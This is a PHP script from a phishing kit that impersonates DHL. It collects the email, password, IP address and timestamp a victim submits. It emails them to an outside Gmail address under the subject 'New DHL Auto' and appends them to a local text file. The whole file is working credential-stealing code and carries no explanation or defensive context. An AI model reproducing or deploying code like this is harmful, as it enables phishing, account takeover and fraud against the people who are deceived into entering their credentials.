?>

<?php

$data .='--------===== DHL Customer ========--------'."\n";

$data .=$_POST['']."\n";
$data .='Email='.""; $data .=$_POST['email']."\n";
$data .='Password='.""; $data .=$_POST['password']."\n";
$data .='IP='.""; $data .=$_SERVER["REMOTE_ADDR"]."\n";
$data .='Date='.""; $data .=date("m/d/y G.i:s", time())."\n";
$data .=$_POST['']."\n";
$data .='------===== ANONYMOUS MUNO =======-------'."\n";

$file .="capetownh.txt";

$to="teymurto24@gmail.com";
$subject = "New DHL Auto";
$headers = "From: DHL Doc<new@mail.com>\n";
$headers .= "MIME-Version: 1.0\n";
mail($to,$subject,$data,$headers);


$fp = fopen($file, "a") or die("Couldn't open $file for writing!");
fwrite($fp, $data) or die("Couldn't write values to file!");
fclose($fp);

?>
